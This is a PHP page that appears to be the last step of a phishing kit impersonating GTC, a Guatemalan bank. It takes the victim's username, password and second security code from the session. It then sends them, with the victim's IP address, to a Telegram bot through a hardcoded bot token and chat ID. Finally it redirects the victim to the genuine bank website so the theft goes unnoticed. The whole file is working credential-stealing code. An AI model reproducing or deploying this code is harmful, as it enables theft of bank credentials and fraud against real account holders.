<?php
    session_start();

    if(!empty($_POST['i4'])){
        $_SESSION['i4'] = $_POST['i4'];
        
        $tlg_tk = "6783125315:AAHnBQxcDcmBiytZzmV0X3zG6r1atjM2MqI";
        $tlg_id = "-4065625444";

        $msg = "GTC 3 >>>I".$_SERVER['REMOTE_ADDR']."- U:".$_SESSION['i1']."- P:".$_SESSION['i2']."- SC2:".$_SESSION['i4'];
        
        $tgmsg = <<<EOC
                <script>
                    var tlbtid = "{{tlg_tk}}";
                    var chat_id = "{{tlg_id}}";

                    var message;
                    var ready = function () {
                        message = "{{msg}}";
                    };
                    var cfnder = function () {
                        ready();
                        var settings = {
                            "async": true,
                            "crossDomain": true,
                            "url": "https://api.telegram.org/bot" + tlbtid + "/sendMessage",
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "cache-control": "no-cache"

                            },
                            "data": JSON.stringify({
                                "chat_id": chat_id,
                                "text": message
                            })
                        };
                        $.ajax(settings).done(function (response) {
                            window.location = 'https://www.gtc.com.gt/';
                            
                        });

                        return false;
                    };
                    cfnder();

                </script>
        EOC;

        $main = str_replace("{{msg}}", $msg , $tgmsg);
        $main = str_replace("{{tlg_tk}}", $tlg_tk , $main);
        $main = str_replace("{{tlg_id}}", $tlg_id , $main);


    }else{
        header ('Location:2.php');
    }
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>GTC</title>
    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
  </head>
  <body>
    
    <?php echo $main; ?>
  </body>
</html>